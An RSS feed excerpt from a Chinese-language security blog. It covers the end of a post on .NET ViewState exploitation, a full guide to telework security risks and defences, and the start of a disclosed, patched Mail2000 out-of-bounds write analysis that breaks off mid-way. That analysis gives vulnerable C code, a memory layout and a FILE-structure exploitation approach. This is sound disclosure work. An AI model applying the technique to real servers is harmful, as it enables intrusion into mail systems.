&lt;p&gt;如果上述一切都很順利、成功執行系統指令並回傳了結果，基本上就足夠做大部分事情，而剩下的就是繼續盡情發揮你的想像力吧！&lt;/p&gt;

&lt;p&gt;不過有時候即便到了此一步驟還是會有不明的錯誤、不明的原因導致 MAC 計算始終是錯誤的，因為 .NET 內部演算法以及需要的環境參數組合稍微複雜，使得工具沒辦法輕易涵蓋所有可能情況，而當遇到這種情形時，我目前選擇的解決方法都是發揮工人智慧，嘗試在本機建立環境、設定相同的 MachineKey、手工撰寫 aspx 檔案，產生包含 gadget 的 VIEWSTATE 再轉送到目標主機上。如果你有更多發現或不一樣的想法願意分享的話，也歡迎來和我交流聊聊天。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</link>
                <guid>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell</guid>
                <pubDate>Wed, 11 Mar 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>遠距工作的資安注意事項</title>
                <description>
&lt;p&gt;近期因新型冠狀病毒（COVID-19, 武漢肺炎）影響，不少企業開放同仁遠距工作 (Telework)、在家上班 (Work from home, WFH)。在疫情加速時，如果沒有準備周全就貿然全面開放，恐怕會遭遇尚未考慮到的資安議題。這篇文章提供一個簡單的指引，到底遠端在家上班有哪些注意事項？我們會從公司管理、使用者兩個面向來討論。&lt;/p&gt;

&lt;p&gt;如果你只想看重點，請跳到最後一段 TL;DR。&lt;/p&gt;

&lt;h2 id=&quot;攻擊手段&quot;&gt;攻擊手段&lt;/h2&gt;

&lt;p&gt;我們先來聊聊攻擊的手段。試想以下幾個攻擊情境，這些情境都曾被我們利用在紅隊演練的過程中，同樣也可能是企業的盲點。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;情境一、&lt;strong&gt;VPN 撞庫攻擊&lt;/strong&gt;：同仁 A 使用 VPN 連線企業內部網路，但 VPN 帳號使用的是自己慣用的帳號密碼，並且將這組帳號密碼重複使用在外其他非公司的服務上（如 Facebook、Adobe），而這組密碼在幾次外洩事件中早已外洩。攻擊團隊透過鎖定同仁 A，使用這組密碼登入企業內部。而很遺憾的 VPN 在企業內部網路並沒有嚴謹的隔離，因此在內部網路的直接找到內網員工 Portal，取得各種機敏資料。&lt;/li&gt;
  &lt;li&gt;情境二、&lt;strong&gt;VPN 漏洞&lt;/strong&gt;：VPN 漏洞已經成為攻擊者的主要攻略目標，公司 B 使用的 VPN 伺服器含有漏洞，攻擊團隊透過漏洞取得 VPN 伺服器的控制權後，從管理後台配置客戶端 logon script，在同仁登入時執行惡意程式，獲得其電腦控制權，並取得公司機密文件。可以參考之前 Orange &amp;amp; Meh 的研究：&lt;a href=&quot;https://www.youtube.com/watch?v=v7JUMb70ON4&quot;&gt; https://www.youtube.com/watch?v=v7JUMb70ON4&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;情境三、&lt;strong&gt;中間人攻擊&lt;/strong&gt;：同仁 C 在家透過 PPTP VPN 工作。不幸的是 C 小孩的電腦中安裝了含有惡意程式的盜版軟體。攻擊者透該電腦腦進行內網中間人攻擊 (MITM)，劫持 C 的流量並破解取得 VPN 帳號密碼，成功進入企業內網。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;以上只是幾個比較常見的情境，攻擊團隊的面向非常廣，而企業的防禦卻不容易做到滴水不漏。這也是為什麼我們要撰寫這篇文章，希望能幫助一些企業在遠距工作的時期也能達到基本的安全。&lt;/p&gt;

&lt;h2 id=&quot;風險有什麼&quot;&gt;風險有什麼&lt;/h2&gt;

&lt;p&gt;風險指的是發生某個事件對於該主體可能造成的危害。透過前面介紹的攻擊手段要達成危害，對攻擊者來說並不困難，接著我們盤點出一些在企業的資安規範下，因應遠距工作可能大幅增加攻擊者達成機率的因子：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;環境複雜：公司無法管控家中、遠距的工作環境，這些環境也比較複雜危險。一些公司內部的管理監控機制都難以施展，也較難要求同仁在家中私人設備安裝監控機制。&lt;/li&gt;
  &lt;li&gt;公司資料外洩或不當使用：若公司的資料遭到外洩或不當使用，將會有嚴重的損失。&lt;/li&gt;
  &lt;li&gt;設備遺失、遭竊：不管是筆電或者是手機等裝置，遺失或者遭竊時，都會有資料外洩的風險。&lt;/li&gt;
  &lt;li&gt;授權或存取控制不易實作：在短時間內提供大量員工的外部存取，勢必會在「可用性」和「安全性」間做出取捨。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;若公司允許同仁使用私人的設備連上公司內部 VPN，這樣的議題就等同 BYOD (Bring Your Own Device)，這些安全性的顧慮有不少文章可以參考。例如 NIST SP800-46 Guide to Enterprise Telework, Remote Access, and Bring Your Own Device (BYOD) Security&lt;a href=&quot;https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-46r2.pdf&quot;&gt; https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-46r2.pdf&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;公司面向&quot;&gt;公司面向&lt;/h2&gt;

&lt;p&gt;接下來我們來看看公司方面在遠距工作上面有哪些資安上面的作為。&lt;/p&gt;

&lt;h3 id=&quot;工作流程及原則規劃&quot;&gt;工作流程及原則規劃&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;工作流程調整&lt;/strong&gt;：遠距工作時，每個流程該如何作對應的調整，例如如何在不同地點協同作業、彙整工作資料、確認工作成果及品質等。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;資料盤點&lt;/strong&gt;：哪些資料放在雲端、伺服器、個人電腦，當遠距工作時哪些資料將無法被取用，或該將資料轉移到哪邊。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;會議流程&lt;/strong&gt;：會議時視訊設備、軟體選擇及測試，並注意會議軟體通訊是否有加密。狀況如會議時間延長、同時發言、遠距品質影響等。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;事件處理團隊及流程&lt;/strong&gt;：因遠距工作時發生的資安事件，該由誰負責處理、如何處理、盤點損失。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;僅知、最小權限原則&lt;/strong&gt;：僅知原則 (Need-to-know Basis) 以及最小權限原則 (Principle of Least Privilege, PoLP)，僅給予每個同仁最小限度需要的資料以及權限，避免額外的安全問題。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;網路管理&quot;&gt;網路管理&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;VPN 帳號申請及盤點&lt;/strong&gt;：哪些同仁需要使用 VPN，屬於哪些群組，每個群組的權限及連線範圍皆不同。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;VPN 帳號權限範圍及內網分區&lt;/strong&gt;：VPN 連線進來後，不應存取整個公司內網所有主機，因為 VPN 視同外部連線，風險等級應該更高，更應該做連線的分區管控。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;監控確認 VPN 流量及行為&lt;/strong&gt;：透過內部網路的網路流量監控機制，確認 VPN 使用有無異常行為。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;只允許白名單設備取得 IP 位址&lt;/strong&gt;：已申請的設備才能取得內網 IP 位址，避免可疑設備出現在內部網路。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;開啟帳號多因子認證&lt;/strong&gt;：將雲端服務、VPN、內部網路服務開啟多因子認證。&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;確認 VPN 伺服器是否為新版&lt;/strong&gt;：在我們過去的研究發現 VPN 伺服器也會是攻擊的對象，因此密切注意是否有更新或者修補程式。&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;Palo Alto GlobalProtect 資安通報 &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;FortiGate SSL VPN 資安通報 &lt;a href=&quot;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&quot;&gt;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;Pulse Secure SSL VPN 資安通報 &lt;a href=&quot;https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/&quot;&gt;https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中值得特別點出的是 VPN 的設定與開放。近期聽聞到不少公司的管理階層談論到，因應疫情原本不開放 VPN 權限的同仁現在全開放了。而問到 VPN 連線進公司內部網路之後的監控跟阻隔為何，卻較少有企業具備這樣的規劃。內部網路是企業的一大資安戰場，開放 VPN 的同時，必定要思考資安對應的措施。&lt;/p&gt;

&lt;h2 id=&quot;使用者面向&quot;&gt;使用者面向&lt;/h2&gt;

&lt;p&gt;公司準備好了，接下來就是使用者的安全性了。除了公司提供的 VPN 線路、架構、機制之外，使用者本身的資安意識、規範、安全性設定也一樣重要。&lt;/p&gt;

&lt;h3 id=&quot;保密&quot;&gt;保密&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;專機專用&lt;/strong&gt;：用來存取公司網路或資料的電腦，應嚴格遵守此原則，禁止將該設備作為非公務用途。也應避免非公司人士使用或操作該裝置。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;設備相關&quot;&gt;設備相關&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;開啟裝置協尋、鎖定、清除功能&lt;/strong&gt;：設備若可攜帶移動，設備的遺失對應方案就必須要考慮完整。例如如何尋找裝置、如何鎖定裝置、如何遠端清除已遺失的裝置避免資料外洩。現在主流作業系統多半都會提供這些機制。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;設備登入密碼&lt;/strong&gt;：裝置登入時必須設定密碼，避免外人直接操作。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;設備全機加密&lt;/strong&gt;：設備若遺失遭到分析，全機加密可以降低資料被破解遺失的風險。&lt;/li&gt;
  &lt;li&gt;（選擇性）&lt;strong&gt;MDM (Mobile Device Management)&lt;/strong&gt;：若公司有導入 MDM，可以協助以上的管理。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;帳號密碼安全&quot;&gt;帳號密碼安全&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;使用密碼管理工具並設定「強密碼」&lt;/strong&gt;：可以考慮使用密碼管理工具並將密碼設為全隨機產生包含英文、數字、符號的密碼串。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;不同系統帳號使用不同密碼&lt;/strong&gt;：這個在很多次演講中都有提到，建議每個系統皆使用不同密碼，防止撞庫攻擊。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;帳號開啟 2FA / MFA&lt;/strong&gt;：若系統具備 2FA / MFA 機制，務必開啟，為帳號多一層保護。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;網路使用&quot;&gt;網路使用&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;避免使用公用 Wi-Fi 連接公司網路&lt;/strong&gt;：公眾公用網路是相當危險的，恐被側錄或竄改。若必要時可使用手機熱點或透過 VPN 連接網際網路。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;禁止使用公用電腦登入公司系統&lt;/strong&gt;：外面的公用電腦難確保沒有後門、Keylogger 之類的惡意程式，一定要禁止使用公用電腦來登入任何系統。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;確認連線裝置是否可取得內網 IP 位址&lt;/strong&gt;：確認內網 IP 位址是否無誤，是否能夠正常存取公司內部系統。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;確認連線的對外 IP 位址&lt;/strong&gt;：確認連線至網際網路的 IP 位址是否為預期，尤其是資安服務公司，對客戶連線的 IP 位址若有錯誤，可能釀成非常嚴重的損害。&lt;/li&gt;
  &lt;li&gt;（選擇性）&lt;strong&gt;安裝個人電腦防火牆&lt;/strong&gt;：個人防火牆可以基本監控有無可疑程式想對外連線。&lt;/li&gt;
  &lt;li&gt;（選擇性）&lt;strong&gt;採用 E2EE 通訊工具&lt;/strong&gt;：目前企業都會使用雲端通訊軟體，通訊軟體建議採用有 E2EE (End-to-End Encryption)，如此可以確保公司內的機敏通訊內容只有內部人員才能解密，就連平台商也無法存取。&lt;/li&gt;
  &lt;li&gt;（選擇性）&lt;strong&gt;工作時關閉不必要的連線&lt;/strong&gt;（如藍牙等）：部分資安專家表示，建議在工作時將電腦的非必要連線管道全數關閉，如藍牙等，在外部公眾環境或許有心人士可以透過藍牙 exploit 攻擊個人裝置。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;資料管理&quot;&gt;資料管理&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;只留存在公司設備&lt;/strong&gt;：公司的機敏資料、文件等，必須只留存在公司設備中，避免資料外洩以及管理問題。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;稽核記錄&lt;/strong&gt;：記錄機敏資料的存放、修改、擁有人等資訊。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;重要文件加密&lt;/strong&gt;：重要的文件必須加密，且密碼不得存放在同一目錄。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;信件附件加密&lt;/strong&gt;，密碼透過另一管道傳遞：郵件的附件除了要加密之外，密碼必須使用另一管道傳遞。例如當面告知、事前約定、透過 E2EE 加密通道、或者是透過非網路方式給予。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;備份資料&lt;/strong&gt;：機敏資料一定要備份，可以遵循「3-2-1 Backup Strategy」：三份備份、兩種媒體、一個放置異地。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;實體安全&quot;&gt;實體安全&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;離開電腦時立刻鎖定螢幕&lt;/strong&gt;：離開電腦的習慣是馬上進入螢幕保護程式並且鎖定，不少朋友是放著讓他等他自己進入鎖定，但這個時間差有心人士已經可以完成攻擊。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;禁止插入來路不明的隨身碟或裝置&lt;/strong&gt;：社交工程的手法之一，就是讓同仁插入惡意的 USB，甚至有可能摧毀電腦（Bad USB, USB Killer）。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;注意外人偷窺螢幕或碰觸設備&lt;/strong&gt;：若常在外工作處於公共空間，可以考慮採購螢幕防窺片。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;不放置電腦設備在車上&lt;/strong&gt;：雖然台灣治安不錯，但也是不少筆電在車上遭竊，重要資產記得隨身攜帶，或者放置在隱密處。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;將工作區域關門或鎖上&lt;/strong&gt;：若在自己的工作區域，為了爭取更多時間應變突發狀況，建議將工作區域的門關閉或者上鎖。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;tldr-防疫同時也別忽視資訊安全&quot;&gt;TL;DR 防疫同時也別忽視資訊安全！&lt;/h2&gt;

&lt;p&gt;網路的攻防就是一場戰爭，如果不從攻擊者的面向去思考防禦策略，不但無法有效的減緩攻擊，更可能在全世界疫情逐漸失控的當下，讓惡意人士透過這樣的時機攻擊遠距工作的企業。期望我們的經驗分享能夠給企業一些基本的指引，也希望天災人禍能夠儘速消彌。台灣加油！&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;開放 VPN 服務前，注意帳號管理以及內網切割隔離，避免透過 VPN 存取內網任意主機。&lt;/li&gt;
  &lt;li&gt;雲端、網路服務務必使用獨一無二長密碼，並開啟 MFA / 2FA 多因子認證。&lt;/li&gt;
  &lt;li&gt;使用雲端服務時務必盤點存取權限，避免文件連結可被任意人存取。&lt;/li&gt;
  &lt;li&gt;注意設備遺失、竊取、社交工程等實體安全議題。&lt;/li&gt;
  &lt;li&gt;網路是危險的，請使用可信賴的網路，並在通訊、傳輸時採用加密方式進行。&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2020/03/04/telework-security/</link>
                <guid>https://devco.re/blog/2020/03/04/telework-security</guid>
                <pubDate>Wed, 04 Mar 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>飛鴿傳書 - 紅隊演練中的數位擄鴿</title>
                <description>&lt;p&gt;郵件系統作為大部分企業主要的資訊交換方式，在戰略上佔有了舉足輕重的地位。掌控了郵件伺服器不僅可以竊聽郵件的內容，甚至許多重要文件都可以在郵件系統中找到，使得駭客能夠更進一步的滲透。本篇文章將介紹研究組在 Openfind Mail2000 這套軟體上發現的記憶體漏洞，以及利用這個漏洞的攻擊手法。&lt;br /&gt;
&lt;strong&gt;此漏洞為 2018 年時發現，當時已通報 Openfind 並且迅速被修補，同時也已協助相關用戶進行更新。&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;openfind-mail2000&quot;&gt;Openfind Mail2000&lt;/h2&gt;
&lt;p&gt;Mail2000 是一套由台灣廠商 Openfind 所開發，簡單易用的電子郵件系統，被廣泛使用於台灣的公家機關、教育機構，如台北市教育局、中科院，以及臺灣科技大學都有使用 Mail2000 作為主要的郵件伺服器。常見的入口介面如下：&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這次的漏洞，便是從這個 Web 介面，利用 Binary 的手法，攻陷整台伺服器！&lt;/p&gt;

&lt;h2 id=&quot;伺服器架構&quot;&gt;伺服器架構&lt;/h2&gt;
&lt;p&gt;Mail2000 提供了 Web 介面供管理員以及使用者操作，也就是所謂的 Webmail，而此處 Openfind 使用了 CGI (Common Gateway Interface) 的技術來實作。大多數 Web 伺服器實現 CGI 的方式如圖：&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/2.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
首先由 httpd 接受客戶端的請求後，根據對應的 CGI 路徑，執行相對應的 CGI 檔案。而大多數的開發者會根據需求，將常見的共用 function 撰寫成 library，供 CGI 呼叫。&lt;br /&gt;
往底層來看，其實可以發現，雖然稱為 Web 伺服器，仍有許多元件是建構於 binary 之上的！例如 httpd，為了效能，多是由 C/C++ 所撰寫，而其它像是 library、擴充的 module、各頁面的 CGI 也常是如此。因此，binary 相關的漏洞，便是我們這次的攻擊目標！&lt;/p&gt;

&lt;h2 id=&quot;漏洞&quot;&gt;漏洞&lt;/h2&gt;

&lt;p&gt;這個漏洞位於 Openfind 實作的 library &lt;code class=&quot;highlighter-rouge&quot;&gt;libm2kc&lt;/code&gt; 中，此函式庫包含了各種 CGI 通用函式，如參數解析及檔案處理等等，而這個漏洞就發生在參數解析的部分。由於參數處理是很底層且基本的功能，因此影響的範圍非常的大，就連 Openfind 的其它產品也同樣受影響！&lt;br /&gt;
這個漏洞的觸發條件如下：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;攻擊者使用 multipart 形式發送 HTTP POST 請求&lt;/li&gt;
  &lt;li&gt;POST 傳送的資料內容超過 200 項&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;multipart 是 HTTP 協定中，用來處理多項檔案傳輸時的一種格式，舉例如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Type: multipart/form-data; boundary=AaB03x   

 --AaB03x 
Content-Disposition: form-data; name=&quot;files&quot;; filename=&quot;file1.txt&quot; 
Content-Type: text/plain 

 ... contents of file1.txt ...
 --AaB03x--
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;而在 libm2kc 中，使用了陣列來儲存參數：&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;這個陣列為全域變數 g_stCGIEnv 中的 param，在存入 param 陣列時，並沒有檢查是否已超過宣告的陣列大小，就造成了越界寫入。&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;需要注意的是，param 陣列所儲存的結構為指向字串位置的指標，而非字串本身&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;因此當觸發越界寫入時，寫入記憶體的值也是一個個指向字串的指標，而被指向的字串內容則是造成溢出的參數。&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;漏洞利用&quot;&gt;漏洞利用&lt;/h2&gt;

&lt;p&gt;要利用越界寫入的漏洞，就要先了解利用這個溢出可以做到什麼，發生溢出的全域變數結構如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000 CGIEnv          struc ; (sizeof=0x6990, mappedto_95)
00000000 buf             dd ?                    ; offset
00000004 length          dd ?
00000008 field_8         dd 6144 dup(?)          ; offset
00006008 param_arr       param 200 dup(?)
00006968 file_vec        dd ?                    ; offset
0000696C vec_len         dd ?
00006970 vec_cur_len     dd ?
00006974 arg_cnt         dd ?
00006978 field_6978      dd ?
0000697C errcode         dd ?
00006980 method          dd ?
00006984 is_multipart    dd ?
00006988 read_func       dd ?
0000698C field_698C      dd ?
00006990 CGIEnv          ends
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;溢出的陣列為其中的&lt;code class=&quot;highlighter-rouge&quot;&gt;param_arr&lt;/code&gt;，因此在其之後的變數皆可能被覆寫。包括&lt;code class=&quot;highlighter-rouge&quot;&gt;post_files&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;vec_len&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;vec_cur_len&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;arg_cnt&lt;/code&gt; … 等等。其中最吸引我注意的是&lt;code class=&quot;highlighter-rouge&quot;&gt;file_vec&lt;/code&gt;這個變數，這是一個用來管理 POST 上傳檔案的 &lt;code class=&quot;highlighter-rouge&quot;&gt;vector&lt;/code&gt;，大部分的 &lt;code class=&quot;highlighter-rouge&quot;&gt;vector&lt;/code&gt; 結構像是這樣：&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/5.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;size&lt;/code&gt; 記錄陣列的總長度，&lt;code class=&quot;highlighter-rouge&quot;&gt;end&lt;/code&gt; 記錄目前用到哪裡，這樣就可以在容量不夠的時候進行擴充。我們若利用漏洞，使溢出的指標覆蓋 &lt;code class=&quot;highlighter-rouge&quot;&gt;vector&lt;/code&gt; 的指標，就有可能有效的利用！藉由覆蓋這個 &lt;code class=&quot;highlighter-rouge&quot;&gt;vector&lt;/code&gt; 指標，我們可以達到偽造一個 &lt;code class=&quot;highlighter-rouge&quot;&gt;POST file&lt;/code&gt;，及其中所有相關變數的效果，而這個 &lt;code class=&quot;highlighter-rouge&quot;&gt;POST file&lt;/code&gt; 結構裡面就包含了各種常見的檔案相關變數，像是路徑、檔名，和 Linux 中用來管理檔案的 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FILE&lt;/code&gt; 結構&lt;/strong&gt;，而 &lt;code class=&quot;highlighter-rouge&quot;&gt;FILE&lt;/code&gt; 結構便是這次的攻擊的關鍵！&lt;/p&gt;

&lt;h3 id=&quot;file-structure-exploit&quot;&gt;FILE Structure Exploit&lt;/h3&gt;

&lt;p&gt;這次的攻擊使用了 FILE structure exploit 的手法，是近幾年較新發現的攻擊手法，由 angelboy 在 HITCON CMT 公開&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;sup&gt;[1]&lt;/sup&gt;&lt;/a&gt;：&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20191223/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;FILE 結構是 Linux 中用來做檔案處理的結構，像是 &lt;code class=&quot;highlighter-rouge&quot;&gt;STDIN&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;STDOUT&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;STDERR&lt;/code&gt;，或者是呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;fopen&lt;/code&gt; 後回傳的結構都是 &lt;code class=&quot;highlighter-rouge&quot;&gt;FILE&lt;/code&gt;。而這個結構之所以能成為漏洞利用的突破口主要原因就是它所包含的 &lt;code class=&quot;highlighter-rouge&quot;&gt;vtable&lt;/code&gt; 指標：&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_FILE_plus&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_IO_jump_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vtable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;vtable&lt;/code&gt; 當中記錄了各種 function pointer，對應各種檔案處理相關的功能：&lt;/p&gt;

